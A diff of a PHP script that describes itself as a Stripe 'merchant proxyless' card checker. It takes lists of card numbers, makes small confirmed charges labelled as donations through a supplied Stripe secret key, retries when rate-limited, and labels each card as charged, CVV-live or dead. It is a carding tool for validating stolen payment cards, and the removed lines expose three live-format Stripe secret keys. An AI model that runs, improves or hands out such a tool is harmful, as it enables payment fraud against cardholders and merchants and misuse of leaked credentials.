@@ -1,7 +1,8 @@
 <?php
 
 
-
+//===================== [ MADE BY SHERMAN ] ====================//
+#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
 
 
 
@@ -28,21 +29,8 @@ function multiexplode($seperator, $string){
     };
 
 $idd = $_GET['idd'];
-$amt = $_GET['cst'];
-if(empty($amt)) {
-	$amt = '5';
-	$chr = $amt * 100;
-}
+$amt = '10';
 $sk = $_GET['sec'];
-if(!$sk){
-  #$sk = "";
-  $sks = array(
-    "sk_live_q2EVOc6DEh7ODm8l6AQv1mzo",
-    "sk_live_40nB0WoYZffkHrFRtnBd8LoV00u6NNbq1k",
-    "sk_live_r3SkUDY2IoOyV5kkejEgwPh5"
-);
-  $sk = $sks[array_rand($sks)];    
-}
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
     $mes = multiexplode(array(":", "|", ""), $lista)[1];
@@ -58,102 +46,61 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 //================= [ CURL REQUESTS ] =================//
 
-#-------------------[1st REQ]--------------------#
-$x = 0;  
-
-while(true)  
-
-{  
-
-$ch = curl_init();  
-
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
-
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
-
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
-
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
-
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
-
-curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
-
-$result1 = curl_exec($ch);  
-
-$tok1 = Getstr($result1,'"id": "','"');  
-
-$msg = Getstr($result1,'"message": "','"');  
-
-//echo "<br><b>Result1: </b> $result1<br>";  
-
-if (strpos($result1, "rate_limit"))   
-
-{  
-
-    $x++;  
-
-    continue;  
-
-}  
-
-break;  
-
-}
-#-------------------[2nd REQ]--------------------#
-
-$x = 0;  
-
-while(true)  
-
-{  
-
-$ch = curl_init();  
-
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
-
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
-
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
-
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
-
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
-
-curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=SoilMan Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
-
-$result2 = curl_exec($ch);  
-
-$tok2 = Getstr($result2,'"id": "','"');  
-
-$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
-
-//echo "<br><b>Result2: </b> $result2<br>";  
-
-if (strpos($result2, "rate_limit"))   
-
-{  
-
-    $x++;  
-
-    continue;  
-
-}  
-
-break;  
-
-}
+    #-------------------[1st REQ]--------------------#  
+    $x = 0;  
+    while(true)  
+    {  
+        $ch = curl_init();  
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
+        $result1 = curl_exec($ch);  
+        $tok1 = Getstr($result1,'"id": "','"');  
+        $msg = Getstr($result1,'"message": "','"');  
+        //echo "<br><b>Result1: </b> $result1<br>";  
+        if (strpos($result1, "rate_limit"))   
+        {  
+            $x++;  
+            continue;  
+        }  
+        break;  
+    }  
+  
+  
+    #------------------[2nd REQ]--------------------#  
+    $x = 0;  
+    while(true)  
+    {  
+        $ch = curl_init();  
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=eur&payment_method_types[]=card&description=Shahad Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+        $result2 = curl_exec($ch);  
+        $tok2 = Getstr($result2,'"id": "','"');  
+        $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
+        //echo "<br><b>Result2: </b> $result2<br>";  
+        if (strpos($result2, "rate_limit"))   
+        {  
+            $x++;  
+            continue;  
+        }  
+        break;  
+    }
 
 
 
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ SoilMan0_0  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
@@ -207,7 +154,7 @@ elseif(strpos($result2, "lost_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
-    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY checker</span> <br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY SHAHAD</span> <br>';
 }
 
 elseif(strpos($result2, "stolen_card" )) {
@@ -346,13 +293,15 @@ elseif(strpos($result1, "card_not_supported" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
 }
 else {
-    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: UNKNOWN ERROR</span><br>';
    
    
       
 }
 
 
+
+//===================== [ MADE BY ITSSWAGGER ] ====================//
 
 
 //echo "<br><b>Lista:</b> $lista<br>";
@@ -362,6 +311,11 @@ else {
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
 
+//echo "<br><b>Result3: </b> $result2<br>";
+
+curl_close($ch);
+ob_flush();
+?>
 echo " BYPASSING: $x <br>";
 
 //echo "<br><b>Result3: </b> $result2<br>";
